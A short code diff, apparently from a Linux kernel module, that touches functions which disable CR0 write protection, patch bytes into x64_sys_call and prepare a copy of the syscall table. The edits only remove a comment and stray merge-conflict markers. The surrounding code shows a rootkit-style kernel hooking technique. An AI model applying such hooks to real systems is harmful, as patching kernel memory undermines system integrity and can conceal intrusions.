@@ -85,7 +85,7 @@ static ERR hook_edit_x64_sys_call(void)
 
     disable_register_cr0_wp();
     // Write the modified bytes into x64_sys_call memory
-    strncpy((char *)x64_sys_call+7, "\xCC\x00\x00", 3); // recover bytes
+    strncpy((char *)x64_sys_call+7, "\xCC\x00\x00", 3); 
     enable_register_cr0_wp();
 
     return ERR_SUCCESS;
@@ -98,10 +98,6 @@ ERR hook_init(struct crow **crow) {
 
   if (syscall_table == 0)
     return ERR_FAILURE;
-<<<<<<< Updated upstream
-=======
-  }
->>>>>>> Stashed changes
 
   old_syscall_table = kmalloc(sizeof(void *) * __NR_syscalls, __GFP_HIGH);
 
